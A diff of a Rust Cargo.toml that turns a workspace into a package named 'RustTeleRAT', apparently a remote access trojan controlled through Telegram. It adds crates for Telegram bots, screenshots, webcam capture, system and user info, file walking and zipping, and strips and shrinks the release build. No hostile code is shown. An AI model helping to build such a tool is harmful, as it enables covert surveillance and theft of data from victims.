@@ -1,11 +1,44 @@
-[workspace]
-members = [ "camera", "config","main", "system", "info", "scrapper", "utils"]
+[package]
+name = "RustTeleRAT"
+version = "0.2.0"
+edition = "2021"
+
+[lib]
+name = "lib"
+path = "src/lib.rs"
+
+[[bin]]
+name = "one-time"
+path = "src/one_time.rs"
+
+[[bin]]
+name = "long"
+path = "src/long.rs"
+
+[[bin]]
+name = "main"
+path = "src/main.rs"
+
+[dependencies]
+teloxide = { version = "0.12.2", features = ["macros"] }
+tokio = { version =  "1.36.0", features = ["rt-multi-thread", "macros"] }
+walkdir = "2.5.0"
+zip = {version="0.6.6", default-features = false}
+image = "0.24.9"
+ping = "0.5.2"
+win-screenshot = "4.0.7"
+sysinfo = "0.30.6"
+nokhwa = {version="0.10.4", features=["input-native"]}
+reqwest = {version="0.11.24", features=["blocking"]}
+serde = {version="1.0.197", features=["derive"]}
+serde_json = "1.0.114"
+whoami = "1.4.1"
+dirs = "5.0.1"
 
 [profile.release]
 lto = true
 strip = true
 panic = "abort"
 codegen-units = 1
-opt-level = "s"
-
+opt-level = "z"
 
